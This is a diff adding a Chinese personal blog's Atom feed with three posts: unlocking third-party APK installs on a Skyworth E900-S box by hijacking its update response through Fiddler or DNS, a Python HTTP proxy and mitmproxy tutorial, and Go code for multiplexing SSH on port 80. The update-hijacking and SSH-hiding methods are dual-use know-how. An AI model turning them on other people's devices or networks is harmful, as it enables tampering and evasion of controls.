@@ -1,0 +1,461 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>jackyspy&#39;s blog</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2016-11-10T02:46:30.857Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>jackyspy</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>在创维E900-S悦Me盒子上安装第三方软件</title>
+    <link href="http://yoursite.com/2016/11/10/Install-Apks-On-E900-S-YueMe-Box/"/>
+    <id>http://yoursite.com/2016/11/10/Install-Apks-On-E900-S-YueMe-Box/</id>
+    <published>2016-11-10T02:42:54.000Z</published>
+    <updated>2016-11-10T02:46:30.857Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-不甘寂寞"><a href="#0x00-不甘寂寞" class="headerlink" title="0x00 不甘寂寞"></a>0x00 不甘寂寞</h2><p>创维E900-S这款悦Me盒子功能还算可以，但不能接受它禁止安装第三方软件这一点。网上搜了半天，可能是比较新的机型没人关注，找不到任何方法，只好自己动手试试。</p>
+<h2 id="0x01-Fiddler寻路"><a href="#0x01-Fiddler寻路" class="headerlink" title="0x01 Fiddler寻路"></a>0x01 Fiddler寻路</h2><p>请出小伙伴<a href="http://www.telerik.com/fiddler" target="_blank" rel="external">Fiddler</a>，盒子上Wifi挂代理。在高级设置的WLAN中，在已连接的SSID上按住确认键几秒钟会出现修改网络选项，设置好代理服务器（运行Fiddler的机器）的IP和端口。</p>
+<p>在应用市场里面安装几个软件，抓包看到一些APK下载地址。在Fiddler的AutoResponder中替换为需要安装的apk，比如电视猫。再次安装会出现下载不完整的错误提示，初步猜测对文件大小或者Hash值进行了校验。下载原始文件，修改一个字节，AutoResponder替换，发现还是同样的错误，基本判定是对文件Hash进行校验。请求的文件名包含一个32字节的16进制串，估计是MD5，但是经过计算，与文件实际MD5值并不相同。怀疑是经过加了Salt或者其他处理方式得出的最终结果，不知道算法的话无法伪造。而且Url也不是通过网络请求获取，估计是在应用市场里面内置的数据。</p>
+<p>想劫持应用市场的路不通，只能换条路走。还是开着代理，重启盒子，逐条观察Http请求。发现了一个更新应用的请求 <code>http://appStoreRrc.cnitv.net:8090/tv/updater2?userId=&amp;mac=&amp;brand=YUEME&amp;model=E900-S&amp;areaNo=null&amp;osver=990104900.1008000000.10000000200&amp;applist=[{&quot;pkgName&quot;:&quot;com.keylab.speech.core.yueme&quot;,&quot;version&quot;:&quot;3.02.008&quot;},{&quot;pkgName&quot;:&quot;com.keylab.speech.view.yueme&quot;,&quot;version&quot;:&quot;3.01.008&quot;},{&quot;pkgName&quot;:&quot;com.hisense.bluetooth&quot;,&quot;version&quot;:&quot;3.01.008&quot;}]</code> ，返回的Json格式化之后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[</div><div class="line">    &#123;</div><div class="line">        &quot;result&quot;: &#123;</div><div class="line">            &quot;code&quot;: 0,</div><div class="line">            &quot;description&quot;: &quot;成功获取升级信息&quot;,</div><div class="line">            &quot;appURL&quot;: [</div><div class="line">                &#123;</div><div class="line">                    &quot;pkgName&quot;: &quot;com.keylab.speech.core.yueme&quot;,</div><div class="line">                    &quot;version&quot;: &quot;3.02.008&quot;,</div><div class="line">                    &quot;isUpdate&quot;: false,</div><div class="line">                    &quot;url&quot;: &quot;&quot;</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    &quot;fileName&quot;: &quot;aiView_YueMe.apk&quot;,</div><div class="line">                    &quot;appName&quot;: &quot;语音助手view&quot;,</div><div class="line">                    &quot;pkgName&quot;: &quot;com.keylab.speech.view.yueme&quot;,</div><div class="line">                    &quot;version&quot;: &quot;3.02.008&quot;,</div><div class="line">                    &quot;isUpdate&quot;: true,</div><div class="line">                    &quot;url&quot;: &quot;http://RSAppStore.cnitv.net/TV_appation/ctviptv/AD/aiView_YueMe.apk&quot;,</div><div class="line">                    &quot;md5&quot;: &quot;a5e7af5648aa6d2a6d34ffdc925857c0&quot;</div><div class="line">                &#125;,</div><div class="line">                &#123;</div><div class="line">                    &quot;pkgName&quot;: &quot;com.hisense.bluetooth&quot;,</div><div class="line">                    &quot;version&quot;: &quot;3.01.008&quot;,</div><div class="line">                    &quot;isUpdate&quot;: false,</div><div class="line">                    &quot;url&quot;: &quot;&quot;</div><div class="line">                &#125;</div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure></p>
+<p>于是打算在此做文章。同样的，在Fiddler中拦截替换该请求，保证有一个应用的isUpdate值为true，它就会自动尝试下载安装该apk。AutoResponder中替换所有*.apk请求指向本地apk文件，重启盒子。Fiddler里面看到的确下载了我替换的apk文件，再到盒子里面看一下，安装成功！！</p>
+<p>至此，基本有比较清晰的思路了。拦截update请求，将返回的JSON中isUpdate值置为true，url替换为真正需要安装的apk的地址。url如果不是可以直接访问下载的互联网地址，而是本地apk文件的话，进一步在Fiddler中进行拦截替换。</p>
+<p>经过测试，一般系统启动时会检查3个内置软件的版本更新情况，如果返回的JSON中应用列表数量小于3的话，则不会下载安装。如果返回数量大于3，则只下载安装前3个应用。所以这种方法盒子每次启动安装的软件数量是有限制的。</p>
+<h2 id="0x02-Go小程序"><a href="#0x02-Go小程序" class="headerlink" title="0x02 Go小程序"></a>0x02 Go小程序</h2><p>按照前面的方法，已经可以正常安装第三方软件了。但是，还是嫌步骤复杂了一些，尤其是要帮很多朋友大量安装的话就太麻烦。</p>
+<p>简单用Go语言实现了一个小程序<a href="https://github.com/jackyspy/E900-S-proxy" target="_blank" rel="external">E900-S-proxy</a>，实现代理和数据替换功能。只要把待安装的apk文件放到同一目录下，启动程序，即可在电脑上启动一个默认端口为8080的代理服务器。在盒子上设置HTTP代理指向这台电脑的IP，重启设备就可以实现自动安装，大大简化了操作过程，降低门槛。存在的局限是每次最多只能安装3个软件。</p>
+<p>需要Windows下编译好的exe文件的朋友，请移步我在<a href="http://www.hdpfans.com/thread-746619-1-1.html" target="_blank" rel="external">高清范发的帖子</a>。</p>
+<p>最后，软件安装完毕后，别忘了把HTTP代理取消。</p>
+<h2 id="0x03-更多……"><a href="#0x03-更多……" class="headerlink" title="0x03 更多……"></a>0x03 更多……</h2><p>除了设置HTTP代理服务器IP端口意外，其实根据<a href="http://python.jobbole.com/86747/" target="_blank" rel="external">HTTP代理的本质</a>，还可以通过DNS劫持来实现。具体而言，可以在路由器上将域名appStoreRrc.cnitv.net和PROXY都指向运行程序的电脑，当然代理端口要改为8090才行。</p>
+<p>尝试了3款不同一键Root工具，都没能搞定这款机器。更多玩法，期待高手们分享。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00-不甘寂寞&quot;&gt;&lt;a href=&quot;#0x00-不甘寂寞&quot; class=&quot;headerlink&quot; title=&quot;0x00 不甘寂寞&quot;&gt;&lt;/a&gt;0x00 不甘寂寞&lt;/h2&gt;&lt;p&gt;创维E900-S这款悦Me盒子功能还算可以，但不能接受它禁止安装第三方软件这一点。网
+    
+    </summary>
+    
+      <category term="Android" scheme="http://yoursite.com/categories/Android/"/>
+    
+    
+      <category term="创维" scheme="http://yoursite.com/tags/%E5%88%9B%E7%BB%B4/"/>
+    
+      <category term="E900-S" scheme="http://yoursite.com/tags/E900-S/"/>
+    
+      <category term="悦Me" scheme="http://yoursite.com/tags/%E6%82%A6Me/"/>
+    
+      <category term="Go" scheme="http://yoursite.com/tags/Go/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>玩Python之HTTP代理</title>
+    <link href="http://yoursite.com/2016/11/03/Python-Use-Http-Proxy/"/>
+    <id>http://yoursite.com/2016/11/03/Python-Use-Http-Proxy/</id>
+    <published>2016-11-03T07:29:38.000Z</published>
+    <updated>2016-11-10T02:46:30.857Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>大家对HTTP代理应该都非常熟悉，它在很多方面都有着极为广泛的应用。HTTP代理分为正向代理和反向代理两种，后者一般用于将防火墙后面的服务提供给用户访问或者进行负载均衡，典型的有Nginx、HAProxy等。本文所讨论的是正向代理。</p>
+<p>HTTP代理最常见的用途是用于网络共享、网络加速和网络限制突破等。此外，HTTP代理也常用于Web应用调试、Android/IOS APP 中所调用的Web API监控和分析，目前的知名软件有Fiddler、Charles、Burp Suite和mitmproxy等。HTTP代理还可用于请求/响应内容修改，在不改变服务端的情况下为Web应用增加额外的功能或者改变应用行为等。</p>
+<h2 id="0x01-HTTP代理是什么"><a href="#0x01-HTTP代理是什么" class="headerlink" title="0x01 HTTP代理是什么"></a>0x01 HTTP代理是什么</h2><p>HTTP代理本质上是一个Web应用，它和其他普通Web应用没有根本区别。HTTP代理收到请求后，根据Header中Host字段的主机名和Get/POST请求地址综合判断目标主机，建立新的HTTP请求并转发请求数据，并将收到的响应数据转发给客户端。</p>
+<p>如果请求地址是绝对地址，HTTP代理采用该地址中的Host，否则使用Header中的HOST字段。做一个简单测试，假设网络环境如下：</p>
+<ul>
+<li>192.168.1.2 Web服务器</li>
+<li>192.168.1.3 HTTP代理服务器</li>
+</ul>
+<p>使用telnet进行测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ telnet 192.168.1.3</div><div class="line">GET / HTTP/1.0</div><div class="line">HOST: 192.168.1.2</div></pre></td></tr></table></figure>
+<p>注意最后需要连续两个回车，这是HTTP协议要求。完成后，可以收到 <a href="http://192.168.1.2/" target="_blank" rel="external">http://192.168.1.2/</a> 的页面内容。下面做一下调整，GET请求时带上绝对地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ telnet 192.168.1.3</div><div class="line">GET http://httpbin.org/ip HTTP/1.0</div><div class="line">HOST: 192.168.1.2</div></pre></td></tr></table></figure>
+<p>注意这里同样设置了HOST为192.168.1.2，但运行结果却返回了 <a href="http://httpbin.org/ip" target="_blank" rel="external">http://httpbin.org/ip</a> 页面的内容，也就是公网IP地址信息。</p>
+<p>从上面的测试过程可以看出，HTTP代理并不是什么很复杂的东西，只要将原始请求发送到代理服务器即可。在无法设置HTTP代理的情况下，对于少量Host需要走HTTP代理的场景来说，最简单的方式就是将目标Host域名的IP指向代理服务器，可以采取修改hosts文件的方式来实现。</p>
+<h2 id="0x02-Python程序中设置HTTP代理"><a href="#0x02-Python程序中设置HTTP代理" class="headerlink" title="0x02 Python程序中设置HTTP代理"></a>0x02 Python程序中设置HTTP代理</h2><h3 id="urllib2-urllib-代理设置"><a href="#urllib2-urllib-代理设置" class="headerlink" title="urllib2/urllib 代理设置"></a>urllib2/urllib 代理设置</h3><p>urllib2是Python标准库，功能很强大，只是使用起来稍微麻烦一点。在Python 3中，urllib2不再保留，迁移到了urllib模块中。urllib2中通过ProxyHandler来设置使用代理服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">proxy_handler = urllib2.ProxyHandler(&#123;&apos;http&apos;: &apos;121.193.143.249:80&apos;&#125;)</div><div class="line">opener = urllib2.build_opener(proxy_handler)</div><div class="line">r = opener.open(&apos;http://httpbin.org/ip&apos;)</div><div class="line">print(r.read())</div></pre></td></tr></table></figure>
+<p>也可以用install_opener将配置好的opener安装到全局环境中，这样所有的urllib2.urlopen都会自动使用代理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">urllib2.install_opener(opener)</div><div class="line">r = urllib2.urlopen(&apos;http://httpbin.org/ip&apos;)</div><div class="line">print(r.read())</div></pre></td></tr></table></figure>
+<p>在Python 3中，使用urllib。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">proxy_handler = urllib.request.ProxyHandler(&#123;&apos;http&apos;: &apos;http://121.193.143.249:80/&apos;&#125;)</div><div class="line">opener = urllib.request.build_opener(proxy_handler)</div><div class="line">r = opener.open(&apos;http://httpbin.org/ip&apos;)</div><div class="line">print(r.read())</div></pre></td></tr></table></figure>
+<h3 id="requests-代理设置"><a href="#requests-代理设置" class="headerlink" title="requests 代理设置"></a>requests 代理设置</h3><p>requests是目前最优秀的HTTP库之一，也是我平时构造http请求时使用最多的库。它的API设计非常人性化，使用起来很容易上手。给requests设置代理很简单，只需要给proxies设置一个形如 <code>{&#39;http&#39;: &#39;x.x.x.x:8080&#39;, &#39;https&#39;: &#39;x.x.x.x:8080&#39;}</code> 的参数即可。其中http和https相互独立。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">In [5]: requests.get(&apos;http://httpbin.org/ip&apos;, proxies=&#123;&apos;http&apos;: &apos;121.193.143.249:80&apos;&#125;).json()</div><div class="line">Out[5]: &#123;&apos;origin&apos;: &apos;121.193.143.249&apos;&#125;</div></pre></td></tr></table></figure>
+<p>可以直接设置session的proxies属性，省去每次请求都要带上proxies参数的麻烦。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">s = requests.session()</div><div class="line">s.proxies = &#123;&apos;http&apos;: &apos;121.193.143.249:80&apos;&#125;</div><div class="line">print(s.get(&apos;http://httpbin.org/ip&apos;).json())</div></pre></td></tr></table></figure>
+<h2 id="0x03-HTTP-PROXY-HTTPS-PROXY-环境变量"><a href="#0x03-HTTP-PROXY-HTTPS-PROXY-环境变量" class="headerlink" title="0x03 HTTP_PROXY / HTTPS_PROXY 环境变量"></a>0x03 HTTP_PROXY / HTTPS_PROXY 环境变量</h2><p>urllib2 和 Requests 库都能识别 HTTP_PROXY 和 HTTPS_PROXY 环境变量，一旦检测到这些环境变量就会自动设置使用代理。这在用HTTP代理进行调试的时候非常有用，因为不用修改代码，可以随意根据环境变量来调整代理服务器的ip地址和端口。*nix中的大部分软件也都支持HTTP_PROXY环境变量识别，比如curl、wget、axel、aria2c等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ http_proxy=121.193.143.249:80 python -c &apos;import requests; print(requests.get(&quot;http://httpbin.org/ip&quot;).json())&apos;</div><div class="line">&#123;u&apos;origin&apos;: u&apos;121.193.143.249&apos;&#125;</div><div class="line"></div><div class="line">$ http_proxy=121.193.143.249:80 curl httpbin.org/ip</div><div class="line">&#123;</div><div class="line">  &quot;origin&quot;: &quot;121.193.143.249&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在IPython交互环境中，可能经常需要临时性地调试HTTP请求，可以简单通过设置 <code>os.environ[&#39;http_proxy&#39;]</code> 增加/取消HTTP代理来实现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">In [245]: os.environ[&apos;http_proxy&apos;] = &apos;121.193.143.249:80&apos;</div><div class="line">In [246]: requests.get(&quot;http://httpbin.org/ip&quot;).json()</div><div class="line">Out[246]: &#123;u&apos;origin&apos;: u&apos;121.193.143.249&apos;&#125;</div><div class="line">In [249]: os.environ[&apos;http_proxy&apos;] = &apos;&apos;</div><div class="line">In [250]: requests.get(&quot;http://httpbin.org/ip&quot;).json()</div><div class="line">Out[250]: &#123;u&apos;origin&apos;: u&apos;x.x.x.x&apos;&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x04-MITM-Proxy"><a href="#0x04-MITM-Proxy" class="headerlink" title="0x04 MITM-Proxy"></a>0x04 MITM-Proxy</h2><p>MITM 源于 Man-in-the-Middle Attack，指中间人攻击，一般在客户端和服务器之间的网络中拦截、监听和篡改数据。</p>
+<p><a href="https://mitmproxy.org/" target="_blank" rel="external">mitmproxy</a>是一款Python语言开发的开源中间人代理神器，支持SSL，支持透明代理、反向代理，支持流量录制回放，支持自定义脚本等。功能上同Windows中的<a href="http://www.telerik.com/fiddler" target="_blank" rel="external">Fiddler</a>有些类似，但mitmproxy是一款console程序，没有GUI界面，不过用起来还算方便。使用mitmproxy可以很方便的过滤、拦截、修改任意经过代理的HTTP请求/响应数据包，甚至可以利用它的scripting API，编写脚本达到自动拦截修改HTTP数据的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># test.py</div><div class="line">def response(flow):</div><div class="line">    flow.response.headers[&quot;BOOM&quot;] = &quot;boom!boom!boom!&quot;</div></pre></td></tr></table></figure>
+<p>上面的脚本会在所有经过代理的Http响应包头里面加上一个名为BOOM的header。用<code>mitmproxy -s &#39;test.py&#39;</code>命令启动mitmproxy，curl验证结果发现的确多了一个BOOM头。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ http_proxy=localhost:8080 curl -I &apos;httpbin.org/get&apos;</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: nginx</div><div class="line">Date: Thu, 03 Nov 2016 09:02:04 GMT</div><div class="line">Content-Type: application/json</div><div class="line">Content-Length: 186</div><div class="line">Connection: keep-alive</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">BOOM: boom!boom!boom!</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>显然mitmproxy脚本能做的事情远不止这些，结合Python强大的功能，可以衍生出很多应用途径。除此之外，mitmproxy还提供了强大的API，在这些API的基础上，完全可以自己定制一个实现了特殊功能的专属代理服务器。</p>
+<p>经过性能测试，发现mitmproxy的效率并不是特别高。如果只是用于调试目的那还好，但如果要用到生产环境，有大量并发请求通过代理的时候，性能还是稍微差点。我用twisted实现了一个简单的proxy，用于给公司内部网站增加功能、改善用户体验，以后有机会再和大家分享。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;大家对HTTP代理应该都非常熟悉，它在很多方面都有着极为广泛的应用。HTTP代理分为正向代理和反向代
+    
+    </summary>
+    
+      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
+    
+    
+      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
+    
+      <category term="Proxy" scheme="http://yoursite.com/tags/Proxy/"/>
+    
+      <category term="代理" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%90%86/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何在Web服务器80端口上开启SSH服务</title>
+    <link href="http://yoursite.com/2016/10/29/Port-Reuse-Protocol-Multiplexer/"/>
+    <id>http://yoursite.com/2016/10/29/Port-Reuse-Protocol-Multiplexer/</id>
+    <published>2016-10-29T12:16:43.000Z</published>
+    <updated>2016-11-10T02:46:30.857Z</updated>
+    
+    <content type="html"><![CDATA[<p>本文所讨论的网络端口复用并非指网络编程中采用SO_REUSEADDR选项的 Socket Bind 复用。它更像是一个带特定路由功能的端口转发工具，在应用层实现。</p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>笔者所处网络中防火墙只开放了一个端口，但却希望能够提供多种网络服务用于测试。所以需要寻求一种解决方案，能够对TCP数据包特征进行识别，用以实现在一个开放端口上同时提供HTTP/SSH/MQTT等多种服务。</p>
+<p>比如说，你可以在80端口上复用一个SSH服务，普通用户只知道浏览器访问<a href="http://x.x.x.x/" target="_blank" rel="external">http://x.x.x.x/</a> ，而你却可以用 <code>ssh user@x.x.x.x -p 80</code> 这样的方式来访问你的服务器，这也不失为一种隐藏SSH服务的办法。</p>
+<h2 id="端口复用神器-sslh"><a href="#端口复用神器-sslh" class="headerlink" title="端口复用神器 - sslh"></a>端口复用神器 - sslh</h2><p><a href="http://www.rutschle.net/tech/sslh.shtml" target="_blank" rel="external">sslh</a>是一款采用C语言编写的开源端口复用软件，目前支持 HTTP、SSL、SSH、OpenVPN、tinc、XMPP等多种协议识别。它主要运行于*nix环境，源代码托管在<a href="https://github.com/yrutschle/sslh" target="_blank" rel="external">GitHub</a>上。据官网介绍，Windows系统下可在Cygwin环境中编译运行，笔者未作测试。</p>
+<p>编译过程并不复杂，直接按照官方文档操作，不在此赘述。Debian用户可直接通过<code>sudo apt-get install sslh</code>安装。</p>
+<p>编译生成两个可执行文件：sslh-fork 和 sslh-select 。二者的区别在于工作模式的差异：</p>
+<ul>
+<li><code>sslh-fork</code> 采用*nix的进程fork模型，为每一个TCP连接fork一个子进程来处理包的转发。对于长连接而言，无需频繁建立大量新连接，fork带来的开销基本可以忽略。但是如果对像HTTP这样的短连接请求，采用fork子进程的方式来进行包转发的话，在出现大量并发请求时，效率会受到一定影响。不过fork模式经过了良好测试，运行起来稳定可靠。</li>
+<li><code>sslh-select</code> 采用单线程监控管理所有网络连接，是比较新的一种方式。但相对epool等基于事件的I/O机制来说，select的传统轮询模式效率还是相对较低的。</li>
+</ul>
+<p>sslh支持在配置文件中使用正则表达式来自定义协议识别规则，但是我在尝试 MQTT v3.1 协议识别时，出现了<a href="https://github.com/yrutschle/sslh/issues/87" target="_blank" rel="external">问题</a>。当然也有可能是我编写的正则表达式和它使用的正则库不匹配。</p>
+<h2 id="高性能负载均衡器-HAProxy"><a href="#高性能负载均衡器-HAProxy" class="headerlink" title="高性能负载均衡器 - HAProxy"></a>高性能负载均衡器 - HAProxy</h2><p><a href="http://www.haproxy.org/" target="_blank" rel="external">HAProxy</a>是一款开源高性能的 TCP/HTTP 软件负载均衡器，目前在游戏后端服务和Web服务器负载均衡等方面都有着非常广泛的应用。通过配置，可以实现多种SSL应用复用同一个端口，比如 HTTPS、SSH、OpenVPN等。这里有一篇<a href="http://www.tuicool.com/articles/auqyuur" target="_blank" rel="external">参考文档</a>。</p>
+<p>虽然HAProxy性能卓越，但它不容易通过扩展来满足特定的需求。</p>
+<h2 id="为网络而生的现代语言-Go"><a href="#为网络而生的现代语言-Go" class="headerlink" title="为网络而生的现代语言 - Go"></a>为网络而生的现代语言 - Go</h2><p><a href="http://golang.org" target="_blank" rel="external">Go</a>语言是近几年我学习研究过的优秀编程语言之一，它的简洁和高效深深吸引了我（我喜欢简单的东西，比如Python）。Go语言的goroutine在语言级别提供并发支持，channel又在这些协程之间提供便捷可靠的通信机制。结合起来，Go语言非常适合编写高并发的网络应用。之前也打算过用Python+gevent的方式，最后还是考虑到Go语言静态编译后的高效率，没有选择Python。</p>
+<p>在Github上翻腾，找到一个Go语言实现的类sslh项目——<a href="https://github.com/jamescun/switcher" target="_blank" rel="external">Switcher</a>。它很久没有更新，支持的协议也非常少——实际上它只能识别SSH协议。Switcher的实现非常简单，核心代码不到200行。于是决定在它的基础上进行改造，实现我所需要的功能。</p>
+<h2 id="D——I——Y"><a href="#D——I——Y" class="headerlink" title="D——I——Y"></a>D——I——Y</h2><p>到Github上<a href="https://github.com/jackyspy/switcher" target="_blank" rel="external">fork</a>了一份Switcher代码，在它的基础上修改。说是修改，其实已面目全非。新的实现中调整了原有架构，去掉对SSH协议的直接支持，转而采用更加通用的协议识别模式，以求达到可以不通过修改程序而只需简单配置即可支持大部分协议，让程序通用性更强一些。</p>
+<p>首先最常见的协议匹配模式是根据packet头几个字节对目标协议特征进行比对。如果只是保存每个协议的头N个字节，不加任何处理逐一比对的话，可能会存在一定的效率问题。一方面，需要对所有pattern进行遍历，逐个与收到的packet进行比较；另一方面，如果网络延时较大，不能一次性收集到足够多的字节，则需要反复多次比对。举一个比较极端的例子，假设我有100个目标协议需要比对匹配，pattern大小都在10字节以上，这时候我通过telnet/netcat连接服务器，一个字节一个字节的发送数据，则服务器可能要进行10*100次字符串比较。</p>
+<p>为了解决这个问题，简单设计了一个树形结构，把所有的pattern都以字节为单位填充到这棵树上，直至末梢。叶节点上保存协议对应的目标IP和端口值。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *MatchTree)</span> <span class="title">Add</span><span class="params">(p *PREFIX)</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> _, patternStr := <span class="keyword">range</span> p.Patterns &#123;</div><div class="line">		pattern := []<span class="keyword">byte</span>(patternStr)</div><div class="line">		node := t.Root</div><div class="line">		<span class="keyword">for</span> i, b := <span class="keyword">range</span> pattern &#123;</div><div class="line">			nodes := node.ChildNodes</div><div class="line">			<span class="keyword">if</span> next_node, ok := nodes[b]; ok &#123;</div><div class="line">				node = next_node</div><div class="line">				<span class="keyword">continue</span></div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="keyword">if</span> nodes == <span class="literal">nil</span> &#123;</div><div class="line">				nodes = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">byte</span>]*MatchTreeNode)</div><div class="line">				node.ChildNodes = nodes</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			root, leaf := createSubTree(pattern[i+<span class="number">1</span>:])</div><div class="line">			leaf.Address = p.Address</div><div class="line">			nodes[b] = root</div><div class="line"></div><div class="line">			<span class="keyword">break</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>也许是我想太多，在需要比对的协议数量很少的情况下，可能这样的设计并不能带来根本上的效率提升。不过我喜欢这种为了可能的效率提升而不断努力的赶脚 ^_^</p>
+<p>相比packet prefix匹配的模式，正则表达式会更加灵活。所以我采取类似sslh的方式，加入了对正则表达式的支持。考虑到效率和具体实现的问题，对正则表达式匹配规则加入了一定的限制，比如需要知道目标字符串的最大长度。正则表达式只能在packet buffer达到一定长度要求的情况下逐一匹配。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *REGEX)</span> <span class="title">Probe</span><span class="params">(header []<span class="keyword">byte</span>)</span> <span class="params">(result ProbeResult, address <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> p.MinLength &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(header) &lt; p.MinLength &#123;</div><div class="line">		<span class="keyword">return</span> TRYAGAIN, <span class="string">""</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> _, re := <span class="keyword">range</span> p.regexpList &#123;</div><div class="line">		<span class="keyword">if</span> re.Match(header) &#123;</div><div class="line">			<span class="keyword">return</span> MATCH, p.Address</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> p.MaxLength &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(header) &gt;= p.MaxLength &#123;</div><div class="line">		<span class="keyword">return</span> UNMATCH, <span class="string">""</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRYAGAIN, <span class="string">""</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>基于上述两种简单的匹配规则，很容易可以构造出ssh、http等常用的协议。在实现中，我加入了一些常用协议的支持，省去用户自定义的麻烦。</p>
